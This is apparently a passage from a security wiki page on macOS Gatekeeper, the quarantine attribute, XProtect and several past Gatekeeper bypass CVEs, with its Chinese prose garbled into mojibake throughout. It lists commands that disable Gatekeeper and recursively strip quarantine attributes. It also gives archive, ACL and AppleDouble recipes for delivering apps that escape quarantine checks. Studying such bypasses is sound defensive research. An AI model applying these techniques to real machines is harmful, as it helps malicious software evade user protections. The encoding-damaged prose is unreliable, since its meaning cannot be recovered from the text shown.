<strong>æ£€æŸ¥</strong> ä»£ç ç­¾åçš„ <strong>æœ‰æ•ˆæ€§</strong> æ˜¯ä¸€ä¸ª <strong>èµ„æºå¯†é›†å‹</strong> è¿‡ç¨‹ï¼ŒåŒ…æ‹¬ç”Ÿæˆä»£ç åŠå…¶æ‰€æœ‰æ†ç»‘èµ„æºçš„åŠ å¯† <strong>å“ˆå¸Œ</strong>ã€‚æ­¤å¤–ï¼Œæ£€æŸ¥è¯ä¹¦æœ‰æ•ˆæ€§è¿˜æ¶‰åŠå¯¹ Apple æœåŠ¡å™¨è¿›è¡Œ <strong>åœ¨çº¿æ£€æŸ¥</strong>ï¼Œä»¥æŸ¥çœ‹å…¶åœ¨å‘æ”¾åæ˜¯å¦è¢«æ’¤é”€ã€‚å› æ­¤ï¼Œå®Œæ•´çš„ä»£ç ç­¾åå’Œå…¬è¯æ£€æŸ¥åœ¨æ¯æ¬¡å¯åŠ¨åº”ç”¨ç¨‹åºæ—¶éƒ½æ˜¯ <strong>ä¸åˆ‡å®é™…çš„</strong>ã€‚</p>
<p>å› æ­¤ï¼Œè¿™äº›æ£€æŸ¥ <strong>ä»…åœ¨æ‰§è¡Œå…·æœ‰éš”ç¦»å±æ€§çš„åº”ç”¨ç¨‹åºæ—¶è¿è¡Œ</strong>ã€‚
{% endhint %}</p>
<p>{% hint style="warning" %}
æ­¤å±æ€§å¿…é¡»ç”± <strong>åˆ›å»º/ä¸‹è½½</strong> æ–‡ä»¶çš„åº”ç”¨ç¨‹åº <strong>è®¾ç½®</strong>ã€‚</p>
<p>ç„¶è€Œï¼Œè¢«æ²™ç›’åŒ–çš„æ–‡ä»¶å°†å¯¹å®ƒä»¬åˆ›å»ºçš„æ¯ä¸ªæ–‡ä»¶è®¾ç½®æ­¤å±æ€§ã€‚éæ²™ç›’åº”ç”¨ç¨‹åºå¯ä»¥è‡ªè¡Œè®¾ç½®ï¼Œæˆ–åœ¨ <strong>Info.plist</strong> ä¸­æŒ‡å®š <a href="https://developer.apple.com/documentation/bundleresources/information_property_list/lsfilequarantineenabled?language=objc"><strong>LSFileQuarantineEnabled</strong></a> é”®ï¼Œè¿™å°†ä½¿ç³»ç»Ÿåœ¨åˆ›å»ºçš„æ–‡ä»¶ä¸Šè®¾ç½® <code>com.apple.quarantine</code> æ‰©å±•å±æ€§ï¼Œ
{% endhint %}</p>
<p>æ­¤å¤–ï¼Œæ‰€æœ‰è°ƒç”¨ <strong><code>qtn_proc_apply_to_self</code></strong> çš„è¿›ç¨‹åˆ›å»ºçš„æ–‡ä»¶éƒ½å°†è¢«éš”ç¦»ã€‚æˆ–è€… API <strong><code>qtn_file_apply_to_path</code></strong> å°†éš”ç¦»å±æ€§æ·»åŠ åˆ°æŒ‡å®šçš„æ–‡ä»¶è·¯å¾„ã€‚</p>
<p>å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ <strong>æ£€æŸ¥å…¶çŠ¶æ€å¹¶å¯ç”¨/ç¦ç”¨</strong>ï¼ˆéœ€è¦ root æƒé™ï¼‰ï¼š</p>
<pre><code class="language-bash">spctl --status
assessments enabled

spctl --enable
spctl --disable
#You can also allow nee identifies to execute code using the binary "spctl"
</code></pre>
<p>æ‚¨è¿˜å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤<strong>æŸ¥æ‰¾æ–‡ä»¶æ˜¯å¦å…·æœ‰éš”ç¦»æ‰©å±•å±æ€§</strong>ï¼š</p>
<pre><code class="language-bash">xattr file.png
com.apple.macl
com.apple.quarantine
</code></pre>
<p>æ£€æŸ¥<strong>æ‰©å±•</strong> <strong>å±æ€§</strong>çš„<strong>å€¼</strong>ï¼Œå¹¶æ‰¾å‡ºå†™å…¥éš”ç¦»å±æ€§çš„åº”ç”¨ç¨‹åºï¼š</p>
<pre><code class="language-bash">xattr -l portada.png
com.apple.macl:
00000000  03 00 53 DA 55 1B AE 4C 4E 88 9D CA B7 5C 50 F3  |..S.U..LN.....P.|
00000010  16 94 03 00 27 63 64 97 98 FB 4F 02 84 F3 D0 DB  |....'cd...O.....|
00000020  89 53 C3 FC 03 00 27 63 64 97 98 FB 4F 02 84 F3  |.S....'cd...O...|
00000030  D0 DB 89 53 C3 FC 00 00 00 00 00 00 00 00 00 00  |...S............|
00000040  00 00 00 00 00 00 00 00                          |........|
00000048
com.apple.quarantine: 00C1;607842eb;Brave;F643CD5F-6071-46AB-83AB-390BA944DEC5
# 00c1 -- It has been allowed to eexcute this file (QTN_FLAG_USER_APPROVED = 0x0040)
# 607842eb -- Timestamp
# Brave -- App
# F643CD5F-6071-46AB-83AB-390BA944DEC5 -- UID assigned to the file downloaded
</code></pre>
<p>å®é™…ä¸Šï¼Œä¸€ä¸ªè¿›ç¨‹â€œå¯ä»¥ä¸ºå®ƒåˆ›å»ºçš„æ–‡ä»¶è®¾ç½®éš”ç¦»æ ‡å¿—â€ï¼ˆæˆ‘å·²ç»å°è¯•åœ¨åˆ›å»ºçš„æ–‡ä»¶ä¸­åº”ç”¨ USER_APPROVED æ ‡å¿—ï¼Œä½†å®ƒä¸ä¼šåº”ç”¨ï¼‰ï¼š</p>
<details>
<summary>æºä»£ç åº”ç”¨éš”ç¦»æ ‡å¿—</summary>
```c
#include <stdio.h>
#include <stdlib.h>
<p>enum qtn_flags {
QTN_FLAG_DOWNLOAD = 0x0001,
QTN_FLAG_SANDBOX = 0x0002,
QTN_FLAG_HARD = 0x0004,
QTN_FLAG_USER_APPROVED = 0x0040,
};</p>
<p>#define qtn_proc_alloc _qtn_proc_alloc
#define qtn_proc_apply_to_self _qtn_proc_apply_to_self
#define qtn_proc_free _qtn_proc_free
#define qtn_proc_init _qtn_proc_init
#define qtn_proc_init_with_self _qtn_proc_init_with_self
#define qtn_proc_set_flags _qtn_proc_set_flags
#define qtn_file_alloc _qtn_file_alloc
#define qtn_file_init_with_path _qtn_file_init_with_path
#define qtn_file_free _qtn_file_free
#define qtn_file_apply_to_path _qtn_file_apply_to_path
#define qtn_file_set_flags _qtn_file_set_flags
#define qtn_file_get_flags _qtn_file_get_flags
#define qtn_proc_set_identifier _qtn_proc_set_identifier</p>
<p>typedef struct _qtn_proc *qtn_proc_t;
typedef struct _qtn_file *qtn_file_t;</p>
<p>int qtn_proc_apply_to_self(qtn_proc_t);
void qtn_proc_init(qtn_proc_t);
int qtn_proc_init_with_self(qtn_proc_t);
int qtn_proc_set_flags(qtn_proc_t, uint32_t flags);
qtn_proc_t qtn_proc_alloc();
void qtn_proc_free(qtn_proc_t);
qtn_file_t qtn_file_alloc(void);
void qtn_file_free(qtn_file_t qf);
int qtn_file_set_flags(qtn_file_t qf, uint32_t flags);
uint32_t qtn_file_get_flags(qtn_file_t qf);
int qtn_file_apply_to_path(qtn_file_t qf, const char *path);
int qtn_file_init_with_path(qtn_file_t qf, const char <em>path);
int qtn_proc_set_identifier(qtn_proc_t qp, const char</em> bundleid);</p>
<p>int main() {</p>
<p>qtn_proc_t qp = qtn_proc_alloc();
qtn_proc_set_identifier(qp, "xyz.hacktricks.qa");
qtn_proc_set_flags(qp, QTN_FLAG_DOWNLOAD | QTN_FLAG_USER_APPROVED);
qtn_proc_apply_to_self(qp);
qtn_proc_free(qp);</p>
<p>FILE *fp;
fp = fopen("thisisquarantined.txt", "w+");
fprintf(fp, "Hello Quarantine\n");
fclose(fp);</p>
<p>return 0;</p>
<p>}</p>
<pre><code>&lt;/details&gt;

å¹¶**ç§»é™¤**è¯¥å±æ€§ï¼š
```bash
xattr -d com.apple.quarantine portada.png
#You can also remove this attribute from every file with
find . -iname '*' -print0 | xargs -0 xattr -d com.apple.quarantine
</code></pre>
<p>å¹¶æ‰¾åˆ°æ‰€æœ‰è¢«éš”ç¦»çš„æ–‡ä»¶ï¼š</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash">find / -exec ls -ld {} \; 2&gt;/dev/null | grep -E "[x\-]@ " | awk '{printf $9; printf "\n"}' | xargs -I {} xattr -lv {} | grep "com.apple.quarantine"
</code></pre>
<p>{% endcode %}</p>
<p>éš”ç¦»ä¿¡æ¯ä¹Ÿå­˜å‚¨åœ¨ç”±LaunchServicesç®¡ç†çš„ä¸­å¤®æ•°æ®åº“ä¸­ï¼Œä½äº**<code>~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2</code>**ï¼Œè¿™å…è®¸GUIè·å–æœ‰å…³æ–‡ä»¶æ¥æºçš„æ•°æ®ã€‚æ­¤å¤–ï¼Œè¿™å¯ä»¥è¢«å¯èƒ½å¸Œæœ›éšè—å…¶æ¥æºçš„åº”ç”¨ç¨‹åºè¦†ç›–ã€‚æ­¤å¤–ï¼Œè¿™å¯ä»¥é€šè¿‡LaunchServices APIå®Œæˆã€‚</p>
<h4 id="libquarantinedylb"><a class="header" href="#libquarantinedylb"><strong>libquarantine.dylb</strong></a></h4>
<p>è¯¥åº“å¯¼å‡ºå¤šä¸ªå‡½æ•°ï¼Œå…è®¸æ“ä½œæ‰©å±•å±æ€§å­—æ®µã€‚</p>
<p><code>qtn_file_*</code> APIå¤„ç†æ–‡ä»¶éš”ç¦»ç­–ç•¥ï¼Œ<code>qtn_proc_*</code> APIåº”ç”¨äºè¿›ç¨‹ï¼ˆç”±è¿›ç¨‹åˆ›å»ºçš„æ–‡ä»¶ï¼‰ã€‚æœªå¯¼å‡ºçš„<code>__qtn_syscall_quarantine*</code>å‡½æ•°æ˜¯åº”ç”¨ç­–ç•¥çš„å‡½æ•°ï¼Œå®ƒè°ƒç”¨<code>mac_syscall</code>ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸º"Quarantine"ï¼Œå°†è¯·æ±‚å‘é€åˆ°<code>Quarantine.kext</code>ã€‚</p>
<h4 id="quarantinekext"><a class="header" href="#quarantinekext"><strong>Quarantine.kext</strong></a></h4>
<p>å†…æ ¸æ‰©å±•ä»…é€šè¿‡<strong>ç³»ç»Ÿä¸Šçš„å†…æ ¸ç¼“å­˜</strong>å¯ç”¨ï¼›ç„¶è€Œï¼Œæ‚¨_å¯ä»¥_ä»<a href="https://developer.apple.com/"><strong>https://developer.apple.com/</strong></a>ä¸‹è½½<strong>å†…æ ¸è°ƒè¯•å·¥å…·åŒ…</strong>ï¼Œå…¶ä¸­å°†åŒ…å«è¯¥æ‰©å±•çš„ç¬¦å·åŒ–ç‰ˆæœ¬ã€‚</p>
<p>è¯¥Kextå°†é€šè¿‡MACFé’©ä½å¤šä¸ªè°ƒç”¨ï¼Œä»¥æ•è·æ‰€æœ‰æ–‡ä»¶ç”Ÿå‘½å‘¨æœŸäº‹ä»¶ï¼šåˆ›å»ºã€æ‰“å¼€ã€é‡å‘½åã€ç¡¬é“¾æ¥...ç”šè‡³<code>setxattr</code>ä»¥é˜²æ­¢å…¶è®¾ç½®<code>com.apple.quarantine</code>æ‰©å±•å±æ€§ã€‚</p>
<p>å®ƒè¿˜ä½¿ç”¨äº†ä¸€äº›MIBï¼š</p>
<ul>
<li><code>security.mac.qtn.sandbox_enforce</code>ï¼šåœ¨æ²™ç®±ä¸­å¼ºåˆ¶æ‰§è¡Œéš”ç¦»</li>
<li><code>security.mac.qtn.user_approved_exec</code>ï¼šéš”ç¦»çš„è¿›ç¨‹åªèƒ½æ‰§è¡Œå·²æ‰¹å‡†çš„æ–‡ä»¶</li>
</ul>
<h3 id="xprotect"><a class="header" href="#xprotect">XProtect</a></h3>
<p>XProtectæ˜¯macOSå†…ç½®çš„<strong>åæ¶æ„è½¯ä»¶</strong>åŠŸèƒ½ã€‚XProtect<strong>åœ¨é¦–æ¬¡å¯åŠ¨æˆ–ä¿®æ”¹åº”ç”¨ç¨‹åºæ—¶æ£€æŸ¥å…¶ä¸å·²çŸ¥æ¶æ„è½¯ä»¶å’Œä¸å®‰å…¨æ–‡ä»¶ç±»å‹çš„æ•°æ®åº“</strong>ã€‚å½“æ‚¨é€šè¿‡æŸäº›åº”ç”¨ç¨‹åºï¼ˆå¦‚Safariã€Mailæˆ–Messagesï¼‰ä¸‹è½½æ–‡ä»¶æ—¶ï¼ŒXProtectä¼šè‡ªåŠ¨æ‰«æè¯¥æ–‡ä»¶ã€‚å¦‚æœå®ƒä¸æ•°æ®åº“ä¸­çš„ä»»ä½•å·²çŸ¥æ¶æ„è½¯ä»¶åŒ¹é…ï¼ŒXProtectå°†<strong>é˜»æ­¢è¯¥æ–‡ä»¶è¿è¡Œ</strong>å¹¶æé†’æ‚¨å­˜åœ¨å¨èƒã€‚</p>
<p>XProtectæ•°æ®åº“ç”±Apple<strong>å®šæœŸæ›´æ–°</strong>æ–°çš„æ¶æ„è½¯ä»¶å®šä¹‰ï¼Œè¿™äº›æ›´æ–°ä¼šè‡ªåŠ¨ä¸‹è½½å¹¶å®‰è£…åœ¨æ‚¨çš„Macä¸Šã€‚è¿™ç¡®ä¿äº†XProtectå§‹ç»ˆä¸æœ€æ–°å·²çŸ¥å¨èƒä¿æŒæœ€æ–°ã€‚</p>
<p>ç„¶è€Œï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œ<strong>XProtectå¹¶ä¸æ˜¯ä¸€ä¸ªåŠŸèƒ½é½å…¨çš„æ€æ¯’è§£å†³æ–¹æ¡ˆ</strong>ã€‚å®ƒä»…æ£€æŸ¥ç‰¹å®šå·²çŸ¥å¨èƒåˆ—è¡¨ï¼Œå¹¶ä¸åƒå¤§å¤šæ•°æ€æ¯’è½¯ä»¶é‚£æ ·æ‰§è¡ŒæŒ‰éœ€æ‰«æã€‚</p>
<p>æ‚¨å¯ä»¥é€šè¿‡è¿è¡Œä»¥ä¸‹å‘½ä»¤è·å–æœ‰å…³æœ€æ–°XProtectæ›´æ–°çš„ä¿¡æ¯ï¼š</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash">system_profiler SPInstallHistoryDataType 2&gt;/dev/null | grep -A 4 "XProtectPlistConfigData" | tail -n 5
</code></pre>
<p>{% endcode %}</p>
<p>XProtect ä½äº SIP ä¿æŠ¤ä½ç½® <strong>/Library/Apple/System/Library/CoreServices/XProtect.bundle</strong>ï¼Œåœ¨è¯¥åŒ…å†…å¯ä»¥æ‰¾åˆ° XProtect ä½¿ç”¨çš„ä¿¡æ¯ï¼š</p>
<ul>
<li><strong><code>XProtect.bundle/Contents/Resources/LegacyEntitlementAllowlist.plist</code></strong>ï¼šå…è®¸å…·æœ‰è¿™äº› cdhash çš„ä»£ç ä½¿ç”¨é—ç•™æƒé™ã€‚</li>
<li><strong><code>XProtect.bundle/Contents/Resources/XProtect.meta.plist</code></strong>ï¼šä¸å…è®¸é€šè¿‡ BundleID å’Œ TeamID åŠ è½½çš„æ’ä»¶å’Œæ‰©å±•çš„åˆ—è¡¨ï¼Œæˆ–æŒ‡ç¤ºæœ€ä½ç‰ˆæœ¬ã€‚</li>
<li><strong><code>XProtect.bundle/Contents/Resources/XProtect.yara</code></strong>ï¼šæ£€æµ‹æ¶æ„è½¯ä»¶çš„ Yara è§„åˆ™ã€‚</li>
<li><strong><code>XProtect.bundle/Contents/Resources/gk.db</code></strong>ï¼šåŒ…å«è¢«é˜»æ­¢åº”ç”¨ç¨‹åºå’Œ TeamIDs å“ˆå¸Œçš„ SQLite3 æ•°æ®åº“ã€‚</li>
</ul>
<p>è¯·æ³¨æ„ï¼Œ<strong><code>/Library/Apple/System/Library/CoreServices/XProtect.app</code></strong> ä¸­è¿˜æœ‰å¦ä¸€ä¸ªä¸ XProtect ç›¸å…³çš„åº”ç”¨ç¨‹åºï¼Œä½†å®ƒä¸ Gatekeeper è¿‡ç¨‹æ— å…³ã€‚</p>
<h3 id="ä¸æ˜¯-gatekeeper"><a class="header" href="#ä¸æ˜¯-gatekeeper">ä¸æ˜¯ Gatekeeper</a></h3>
<p>{% hint style="danger" %}
è¯·æ³¨æ„ï¼ŒGatekeeper <strong>å¹¶ä¸æ˜¯æ¯æ¬¡</strong> æ‰§è¡Œåº”ç”¨ç¨‹åºæ—¶éƒ½ä¼šæ‰§è¡Œï¼Œåªæœ‰ <em><strong>AppleMobileFileIntegrity</strong></em> (AMFI) ä¼šåœ¨æ‰§è¡Œå·²ç»ç”± Gatekeeper æ‰§è¡Œå’ŒéªŒè¯çš„åº”ç”¨ç¨‹åºæ—¶ <strong>éªŒè¯å¯æ‰§è¡Œä»£ç ç­¾å</strong>ã€‚
{% endhint %}</p>
<p>å› æ­¤ï¼Œä¹‹å‰å¯ä»¥æ‰§è¡Œä¸€ä¸ªåº”ç”¨ç¨‹åºä»¥ç¼“å­˜ Gatekeeperï¼Œç„¶å <strong>ä¿®æ”¹åº”ç”¨ç¨‹åºçš„éå¯æ‰§è¡Œæ–‡ä»¶</strong>ï¼ˆå¦‚ Electron asar æˆ– NIB æ–‡ä»¶ï¼‰ï¼Œå¦‚æœæ²¡æœ‰å…¶ä»–ä¿æŠ¤æªæ–½ï¼Œåº”ç”¨ç¨‹åºå°† <strong>æ‰§è¡Œ</strong> å¸¦æœ‰ <strong>æ¶æ„</strong> é™„åŠ å†…å®¹çš„ç‰ˆæœ¬ã€‚</p>
<p>ç„¶è€Œï¼Œç°åœ¨è¿™å·²ä¸å†å¯èƒ½ï¼Œå› ä¸º macOS <strong>é˜²æ­¢ä¿®æ”¹</strong> åº”ç”¨ç¨‹åºåŒ…å†…çš„æ–‡ä»¶ã€‚å› æ­¤ï¼Œå¦‚æœæ‚¨å°è¯• <a href="../macos-proces-abuse/macos-dirty-nib.html">Dirty NIB</a> æ”»å‡»ï¼Œæ‚¨ä¼šå‘ç°ä¸å†å¯èƒ½åˆ©ç”¨å®ƒï¼Œå› ä¸ºåœ¨æ‰§è¡Œåº”ç”¨ç¨‹åºä»¥ç¼“å­˜ Gatekeeper åï¼Œæ‚¨å°†æ— æ³•ä¿®æ”¹è¯¥åŒ…ã€‚å¦‚æœæ‚¨ä¾‹å¦‚å°† Contents ç›®å½•çš„åç§°æ›´æ”¹ä¸º NotConï¼ˆå¦‚æ¼æ´ä¸­æ‰€ç¤ºï¼‰ï¼Œç„¶åæ‰§è¡Œåº”ç”¨ç¨‹åºçš„ä¸»äºŒè¿›åˆ¶æ–‡ä»¶ä»¥ç¼“å­˜ Gatekeeperï¼Œå°†ä¼šè§¦å‘é”™è¯¯å¹¶ä¸”æ— æ³•æ‰§è¡Œã€‚</p>
<h2 id="gatekeeper-ç»•è¿‡"><a class="header" href="#gatekeeper-ç»•è¿‡">Gatekeeper ç»•è¿‡</a></h2>
<p>ä»»ä½•ç»•è¿‡ Gatekeeper çš„æ–¹æ³•ï¼ˆè®¾æ³•è®©ç”¨æˆ·ä¸‹è½½æŸäº›å†…å®¹å¹¶åœ¨ Gatekeeper åº”è¯¥ç¦æ­¢æ—¶æ‰§è¡Œå®ƒï¼‰éƒ½è¢«è§†ä¸º macOS ä¸­çš„æ¼æ´ã€‚è¿™äº›æ˜¯ä¸€äº›åˆ†é…ç»™è¿‡å»å…è®¸ç»•è¿‡ Gatekeeper çš„æŠ€æœ¯çš„ CVEï¼š</p>
<h3 id="cve-2021-1810"><a class="header" href="#cve-2021-1810"><a href="https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810">CVE-2021-1810</a></a></h3>
<p>è§‚å¯Ÿåˆ°å¦‚æœä½¿ç”¨ <strong>Archive Utility</strong> è¿›è¡Œæå–ï¼Œè·¯å¾„è¶…è¿‡ <strong>886 ä¸ªå­—ç¬¦</strong> çš„æ–‡ä»¶ä¸ä¼šæ¥æ”¶ com.apple.quarantine æ‰©å±•å±æ€§ã€‚è¿™ç§æƒ…å†µæ— æ„ä¸­å…è®¸è¿™äº›æ–‡ä»¶ <strong>ç»•è¿‡ Gatekeeper çš„</strong> å®‰å…¨æ£€æŸ¥ã€‚</p>
<p>æŸ¥çœ‹ <a href="https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810"><strong>åŸå§‹æŠ¥å‘Š</strong></a> ä»¥è·å–æ›´å¤šä¿¡æ¯ã€‚</p>
<h3 id="cve-2021-30990"><a class="header" href="#cve-2021-30990"><a href="https://ronmasas.com/posts/bypass-macos-gatekeeper">CVE-2021-30990</a></a></h3>
<p>å½“ä½¿ç”¨ <strong>Automator</strong> åˆ›å»ºåº”ç”¨ç¨‹åºæ—¶ï¼Œå…³äºå…¶æ‰§è¡Œæ‰€éœ€çš„ä¿¡æ¯ä½äº <code>application.app/Contents/document.wflow</code> ä¸­ï¼Œè€Œä¸åœ¨å¯æ‰§è¡Œæ–‡ä»¶ä¸­ã€‚å¯æ‰§è¡Œæ–‡ä»¶åªæ˜¯ä¸€ä¸ªåä¸º <strong>Automator Application Stub</strong> çš„é€šç”¨ Automator äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</p>
<p>å› æ­¤ï¼Œæ‚¨å¯ä»¥ä½¿ <code>application.app/Contents/MacOS/Automator\ Application\ Stub</code> <strong>é€šè¿‡ç¬¦å·é“¾æ¥æŒ‡å‘ç³»ç»Ÿå†…çš„å¦ä¸€ä¸ª Automator Application Stub</strong>ï¼Œå®ƒå°†æ‰§è¡Œ <code>document.wflow</code> ä¸­çš„å†…å®¹ï¼ˆæ‚¨çš„è„šæœ¬ï¼‰ <strong>è€Œä¸ä¼šè§¦å‘ Gatekeeper</strong>ï¼Œå› ä¸ºå®é™…çš„å¯æ‰§è¡Œæ–‡ä»¶æ²¡æœ‰éš”ç¦» xattrã€‚</p>
<p>ç¤ºä¾‹é¢„æœŸä½ç½®ï¼š<code>/System/Library/CoreServices/Automator\ Application\ Stub.app/Contents/MacOS/Automator\ Application\ Stub</code></p>
<p>æŸ¥çœ‹ <a href="https://ronmasas.com/posts/bypass-macos-gatekeeper"><strong>åŸå§‹æŠ¥å‘Š</strong></a> ä»¥è·å–æ›´å¤šä¿¡æ¯ã€‚</p>
<h3 id="cve-2022-22616"><a class="header" href="#cve-2022-22616"><a href="https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/">CVE-2022-22616</a></a></h3>
<p>åœ¨æ­¤ç»•è¿‡ä¸­ï¼Œåˆ›å»ºäº†ä¸€ä¸ª zip æ–‡ä»¶ï¼Œåº”ç”¨ç¨‹åºä» <code>application.app/Contents</code> å¼€å§‹å‹ç¼©ï¼Œè€Œä¸æ˜¯ä» <code>application.app</code>ã€‚å› æ­¤ï¼Œ<strong>éš”ç¦»å±æ€§</strong> åº”ç”¨äºæ‰€æœ‰ <strong>æ¥è‡ª <code>application.app/Contents</code> çš„æ–‡ä»¶</strong>ï¼Œä½† <strong>ä¸é€‚ç”¨äº <code>application.app</code></strong>ï¼Œè¿™æ˜¯ Gatekeeper æ£€æŸ¥çš„å†…å®¹ï¼Œå› æ­¤ Gatekeeper è¢«ç»•è¿‡ï¼Œå› ä¸ºå½“è§¦å‘ <code>application.app</code> æ—¶ <strong>æ²¡æœ‰éš”ç¦»å±æ€§ã€‚</strong></p>
<pre><code class="language-bash">zip -r test.app/Contents test.zip
</code></pre>
<p>æ£€æŸ¥<a href="https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/"><strong>åŸå§‹æŠ¥å‘Š</strong></a>ä»¥è·å–æ›´å¤šä¿¡æ¯ã€‚</p>
<h3 id="cve-2022-32910"><a class="header" href="#cve-2022-32910"><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32910">CVE-2022-32910</a></a></h3>
<p>å³ä½¿ç»„ä»¶ä¸åŒï¼Œæ­¤æ¼æ´çš„åˆ©ç”¨ä¸ä¹‹å‰çš„éå¸¸ç›¸ä¼¼ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°†ä»**<code>application.app/Contents</code><strong>ç”Ÿæˆä¸€ä¸ªAppleå½’æ¡£ï¼Œå› æ­¤</strong><code>application.app</code>åœ¨é€šè¿‡<strong>Archive Utility</strong>è§£å‹ç¼©æ—¶ä¸ä¼šè·å¾—éš”ç¦»å±æ€§**ã€‚</p>
<pre><code class="language-bash">aa archive -d test.app/Contents -o test.app.aar
</code></pre>
<p>æ£€æŸ¥<a href="https://www.jamf.com/blog/jamf-threat-labs-macos-archive-utility-vulnerability/"><strong>åŸå§‹æŠ¥å‘Š</strong></a>ä»¥è·å–æ›´å¤šä¿¡æ¯ã€‚</p>
<h3 id="cve-2022-42821"><a class="header" href="#cve-2022-42821"><a href="https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/">CVE-2022-42821</a></a></h3>
<p>ACL <strong><code>writeextattr</code></strong> å¯ç”¨äºé˜²æ­¢ä»»ä½•äººå‘æ–‡ä»¶ä¸­å†™å…¥å±æ€§ï¼š</p>
<pre><code class="language-bash">touch /tmp/no-attr
chmod +a "everyone deny writeextattr" /tmp/no-attr
xattr -w attrname vale /tmp/no-attr
xattr: [Errno 13] Permission denied: '/tmp/no-attr'
</code></pre>
<p>æ­¤å¤–ï¼Œ<strong>AppleDouble</strong> æ–‡ä»¶æ ¼å¼å¤åˆ¶äº†ä¸€ä¸ªæ–‡ä»¶åŠå…¶ ACEã€‚</p>
<p>åœ¨ <a href="https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html"><strong>æºä»£ç </strong></a> ä¸­å¯ä»¥çœ‹åˆ°ï¼Œå­˜å‚¨åœ¨åä¸º <strong><code>com.apple.acl.text</code></strong> çš„ xattr ä¸­çš„ ACL æ–‡æœ¬è¡¨ç¤ºå°†è¢«è®¾ç½®ä¸ºè§£å‹ç¼©æ–‡ä»¶ä¸­çš„ ACLã€‚å› æ­¤ï¼Œå¦‚æœæ‚¨å°†ä¸€ä¸ªåº”ç”¨ç¨‹åºå‹ç¼©æˆä¸€ä¸ªå¸¦æœ‰ ACL çš„ <strong>AppleDouble</strong> æ–‡ä»¶æ ¼å¼çš„ zip æ–‡ä»¶ï¼Œè¯¥ ACL é˜»æ­¢å…¶ä»– xattrs è¢«å†™å…¥... é‚£ä¹ˆéš”ç¦» xattr å¹¶æ²¡æœ‰è¢«è®¾ç½®åˆ°è¯¥åº”ç”¨ç¨‹åºä¸­ï¼š</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash">chmod +a "everyone deny write,writeattr,writeextattr" /tmp/test
ditto -c -k test test.zip
python3 -m http.server
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr
</code></pre>
<p>{% endcode %}</p>
<p>æŸ¥çœ‹<a href="https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/"><strong>åŸå§‹æŠ¥å‘Š</strong></a>ä»¥è·å–æ›´å¤šä¿¡æ¯ã€‚</p>
<p>è¯·æ³¨æ„ï¼Œè¿™ä¹Ÿå¯ä»¥é€šè¿‡AppleArchivesè¿›è¡Œåˆ©ç”¨ï¼š</p>
<pre><code class="language-bash">mkdir app
touch app/test
chmod +a "everyone deny write,writeattr,writeextattr" app/test
aa archive -d app -o test.aar
</code></pre>
<h3 id="cve-2023-27943"><a class="header" href="#cve-2023-27943"><a href="https://blog.f-secure.com/discovery-of-gatekeeper-bypass-cve-2023-27943/">CVE-2023-27943</a></a></h3>
<p>å‘ç°<strong>Google Chromeæ²¡æœ‰ä¸ºä¸‹è½½çš„æ–‡ä»¶è®¾ç½®éš”ç¦»å±æ€§</strong>ï¼Œè¿™æ˜¯ç”±äºä¸€äº›macOSå†…éƒ¨é—®é¢˜é€ æˆçš„ã€‚</p>
<h3 id="cve-2023-27951"><a class="header" href="#cve-2023-27951"><a href="https://redcanary.com/blog/gatekeeper-bypass-vulnerabilities/">CVE-2023-27951</a></a></h3>
<p>AppleDoubleæ–‡ä»¶æ ¼å¼å°†æ–‡ä»¶çš„å±æ€§å­˜å‚¨åœ¨ä¸€ä¸ªä»¥<code>._</code>å¼€å¤´çš„å•ç‹¬æ–‡ä»¶ä¸­ï¼Œè¿™æœ‰åŠ©äºåœ¨<strong>macOSæœºå™¨ä¹‹é—´</strong>å¤åˆ¶æ–‡ä»¶å±æ€§ã€‚ç„¶è€Œï¼Œæ³¨æ„åˆ°åœ¨è§£å‹AppleDoubleæ–‡ä»¶åï¼Œä»¥<code>._</code>å¼€å¤´çš„æ–‡ä»¶<strong>æ²¡æœ‰è¢«èµ‹äºˆéš”ç¦»å±æ€§</strong>ã€‚</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash">mkdir test
echo a &gt; test/a
echo b &gt; test/b
echo ._a &gt; test/._a
aa archive -d test/ -o test.aar

# If you downloaded the resulting test.aar and decompress it, the file test/._a won't have a quarantitne attribute
</code></pre>
<p>{% endcode %}</p>
<p>èƒ½å¤Ÿåˆ›å»ºä¸€ä¸ªä¸ä¼šè¢«è®¾ç½®ä¸ºéš”ç¦»å±æ€§çš„æ–‡ä»¶ï¼Œ<strong>å¯ä»¥ç»•è¿‡ Gatekeeperã€‚</strong> è¿™ä¸ªæŠ€å·§æ˜¯<strong>ä½¿ç”¨ AppleDouble å‘½åçº¦å®šåˆ›å»ºä¸€ä¸ª DMG æ–‡ä»¶åº”ç”¨ç¨‹åº</strong>ï¼ˆä»¥ <code>._</code> å¼€å¤´ï¼‰ï¼Œå¹¶åˆ›å»ºä¸€ä¸ª<strong>ä½œä¸ºæ­¤éšè—æ–‡ä»¶çš„ç¬¦å·é“¾æ¥çš„å¯è§æ–‡ä»¶</strong>ï¼Œè€Œæ²¡æœ‰éš”ç¦»å±æ€§ã€‚<br />
å½“<strong>dmg æ–‡ä»¶è¢«æ‰§è¡Œ</strong>æ—¶ï¼Œç”±äºå®ƒæ²¡æœ‰éš”ç¦»å±æ€§ï¼Œå®ƒå°†<strong>ç»•è¿‡ Gatekeeper</strong>ã€‚</p>
